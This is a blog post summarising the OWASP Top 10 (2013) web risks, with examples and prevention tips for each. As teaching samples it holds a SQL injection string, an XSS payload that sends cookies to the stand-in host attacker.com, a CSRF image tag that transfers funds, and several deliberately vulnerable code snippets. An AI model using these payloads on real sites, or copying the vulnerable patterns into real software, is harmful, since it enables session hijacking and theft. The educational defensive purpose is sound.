
Security: Owasp Top 10
==========================

.. post:: Jul 05, 2017
   :tags: security
   :category: ComputerScience

The `Open Web Application Security Project (OWASP) <https://www.owasp.org>`_ is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted.
The goal of the Top 10 project is to raise awareness about application security by identifying some of the most critical risks facing organizations. 
This blog is based on 2013 version, while 2017 version will come very soon.

.. contents::

1. Injection
============

Injection has many types:

* SQL injection
* NoSQL injection
* Command injection
* Code injection
* Path traversal
* ORM injection
* XML injection
* XPath injection

Example
----------
A web server makes a query string like the following:

.. code-block:: c

    String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";

The attacker modifies the ‘id’ parameter value in her browser to send: ' or '1'='1.

How to prevent
------------------

* White-list (untrusted data): What input do we trust? Does it adhere to expected pattern?
* Use safe API which provides parameterized interface
* Escape special character
* Positive or 'white list' input validation

2. Broken authentication and session management
=========================================================

It means session management assets like user credentials and session IDs are not properly protected.

Example
----------

If a web site put the token into the query string:

http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii

Then if the user share the link with others, the token/session id will be used by others.

There are other ways to hack the authentication and session management system.

Auth cookie theft: 

* Exploit an XSS risk
* Retrieve it from the victim's PC
* Sniff it over an insecure connection

Account management attack:

* Brute force the login
* Exploit password reset
* Discover weak credentials

Session ID theft:

* Copy and paste a URL with it
* Send it via an insecure email 
* Retrieve it from a log

How to prevent
-----------------

Protect the cookies:

* Use the HttpOnly flag (HttpOnly is an additional flag included in a Set-Cookie HTTP response header, If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script)
* Make sure they're flagged as 'secure'

Decrease the window of risk:

* Expire sessions quickly
* Re-challenge the user on key actions

Other ways:

* Authentication must be over TLS
* Passwords policy
* "Secure" error messages
* Multiple-factor authentication
* CAPTCHA
* Block accounts
* Restore passwords
* No session identifier in URL
* Use TLS
* Logout
* Close browser window
* Secure passwords storage: Do not forget salt; SHA-256, SHA-512; PBKDF2, bcrypt, scrypt

3. Cross-site scripting (XSS)
==============================
XSS has the following types:

* Stored XSS
* Reflected XSS
* DOM Based XSS

Example
-----------

If the web server generate the content by using following code:

.. code-block:: c

    (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";

The attacker modifies the ‘CC’ parameter in his browser to:

.. code-block:: html

    '><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'.

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

How to prevent
----------------

* Validation: Xxs-filters; Secure-filters; Xss; Validator-js
* HttpOnly cookies
* Helmet-csp (Content Security Policy)

4. Insecure direct object references
=====================================

Insecure direct object reference has the vulnerability to let the hacker get to know the internal system design.

Example
--------

If the web server has the following code:

.. code-block:: c

    var messageId = req.params.messageId;
    messagesDAO.getById(messageId, function(error, message)
    {
        return res.render("message", message);
    }

The hacker can use:
http://site.com/view-message?messageId=1

How to prevent
------------------

* Use per user or session indirect object references.
* Check permissions on all application's layers
* Testing & Code review

5. Security misconfiguration
==============================

Example
----------

The app server admin console is automatically installed and not removed. 
Default accounts aren’t changed. 
Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.

How to prevent
---------------

Use following tools:

* Ansible, chef, puppet
* Helmet
* Hpp
* Cors
* Node-ipgeoblock
* Express-limiter
* Safe-regex

6. Sensitive data exposure
============================

Relevant types:

* Sniffing
* Insecure cryptographic storage

Example
----------

The password database uses unsalted hashes to store everyone’s passwords. 
A file upload flaw allows an attacker to retrieve the password file. 
All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.

How to prevent
------------------

* Always use TLS (TLS 1.1 and TSL 1.2)
* Secured control only over HTTPS
* HTTP content in HTTPS pages
* Use cookie's Secure attribute

Use Javascript Cryptography:

* Crypto 
* Sjcl (Stanford)
* Crypto-js
* Node-forge
* Web Cryptography API
* PolyCrypt

7. Missing function level access control
==========================================

Relevant types:

* Security through obscurity
* Checking permissions only in UI
* Missing permissions check in helper services

Example
----------

Attacker uses automated tool like OWASP ZAP or SQLMap to detect vulnerabilities and possibly exploit them.

How to prevent
------------------

* Check permission on all application's layer
* Authentication middleware
* Testing & Code review

8. Cross-site request forgery (CSRF)
=======================================

CSRF indicates token vulnerability.

Example
------------

The application allows a user to submit a state changing request that does not include anything secret. 

For example: 

.. code-block:: c

    http://example.com/app/transferFunds?amount=1500 &destinationAccount=4673243243 

So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control: 

.. code-block:: c

    <img src="http://example.com/app/transferFunds? amount=1500&destinationAccount=attackersAcct#“ width="0" height="0" /> 

If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.

BTW, iframe means inline frame is used to embed another document within the current HTML document.

How to prevent
------------------

The preferred option is to include the unique token in a hidden field. 
This includes the value in the body of the HTTP request, avoiding its exposure in the URL.

Or use csurf

9. Using components with known vulnerabilities
=================================================

If you build your app by using 3rd party components, the know vulnerabilities of the components impact you.
See following links:

* https://nodesecurity.io
* https://snyk.io
* http://cve.mitre.org
* https://nvd.nist.gov
* https://www.exploit-db.com
* https://www.cvedetails.com

10. Unvalidated redirects and forwards
=======================================

Unvalidated url redirects and forwards may also cause problems.

Example
-----------

Let's say if your web site contains following code:

.. code-block:: c

    app.get("/login", function(req, res, next) {
        return res.redirect(req.query.url);
    });

http://site.com/login?url=/admin

Hacker can provide a url which looks exactly the same as the original web page which asks for user name/password.

How to prevent
------------------

* Do not use redirects
* Do not use parameters to create redirect link
* Validate destination parameter: valid-url

References
============

Other valuable references to look:

* https://github.com/OWASP/NodeGoat
* https://github.com/cr0hn/vulnerable-node
* https://github.com/clarkio/vulnerable-app
* https://github.com/toolness/security-adventure
* https://github.com/bkimminich/juice-shop
* https://www.owasp.org/index.php/

*Written by Binwei@Oslo*

